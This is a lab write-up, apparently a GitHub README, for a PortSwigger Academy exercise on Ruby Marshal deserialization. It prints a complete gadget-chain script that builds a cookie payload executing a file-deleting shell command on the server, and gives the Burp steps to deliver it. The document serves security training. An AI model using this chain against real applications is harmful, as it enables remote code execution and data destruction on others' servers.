#  Exploiting Ruby deserialization 

## 📌 Lab Details
- **Title**: Exploiting Ruby deserialization using a documented gadget chain
- **Difficulty**: Practitioner
- **Category**: Insecure Deserialization
- **Lab URL**: https://portswigger.net/academy/labs/launch/c911d0a4c35afb75a94e7710baa76c14054cc1bc85b79632e70e049ed992fc02?referrer=%2fweb-security%2fdeserialization%2fexploiting%2flab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain

## 🔍 Summary
The application uses Ruby’s Marshal serialization mechanism to store session data inside a client-controlled cookie. Because the server deserializes attacker-controlled data without validation, it becomes vulnerable to arbitrary object injection. <br>

Ruby on Rails contains known gadget chains that can be abused during deserialization to achieve Remote Code Execution (RCE). By crafting a malicious serialized object using a documented gadget chain, arbitrary system commands can be executed on the server.

## 🛠 Steps to Solve
1. Log in to your own account and notice that the session cookie contains serialized ("marshaled") Ruby object.
2. Browse the web to find the `Universal Deserialisation Gadget` for Ruby `2.x-3.x` by `vakzz` on devcraft.io. Copy the final script for generating the payload.
3. Modify the script as follows:
   - Change the command that should be executed from `id` to `rm /home/carlos/morale.txt`.
   - Replace the final two lines with `puts Base64.encode64(payload)`.
   ```sh
   # Autoload the required classes
   Gem::SpecFetcher
   Gem::Installer
   
   # prevent the payload from running when we Marshal.dump it
    module Gem
     class Requirement
       def marshal_dump
         [@requirements]
       end
     end
    end

    wa1 = Net::WriteAdapter.new(Kernel, :system)
    rs = Gem::RequestSet.allocate
    rs.instance_variable_set('@sets', wa1)
    rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
    wa2 = Net::WriteAdapter.new(rs, :resolve)
    i = Gem::Package::TarReader::Entry.allocate
    i.instance_variable_set('@read', 0)
    i.instance_variable_set('@header', "aaa")
    n = Net::BufferedIO.allocate
    n.instance_variable_set('@io', i)
    n.instance_variable_set('@debug_output', wa2)
    t = Gem::Package::TarReader.allocate
    t.instance_variable_set('@io', n)
    r = Gem::Requirement.allocate
    r.instance_variable_set('@requirements', t)
    payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
    require 'base64'
    puts Base64.encode64(payload)
   ```
4. Run the script and copy the resulting Base64-encoded object.
5. In Burp Repeater, replace your session cookie with the malicious one that you just created, then URL encode it.
6. Send the request to solve the lab.
   
## 📖 Key Takeaways
- Ruby `Marshal.load()` on untrusted data is extremely dangerous.
- Public gadget chains can convert deserialization into RCE.
- Framework libraries often contain exploitable magic methods.
- Known gadget chains greatly reduce exploitation complexity.

## 🖼️ Screenshot 
<img width="1919" height="905" alt="image" src="https://github.com/user-attachments/assets/2927e254-4ddd-4c5d-9c55-90285fe25780" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/552081cb-2405-4f90-b2b0-d6e73e816082" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4c9400b6-7ff7-47db-976e-07b588c66b31" />
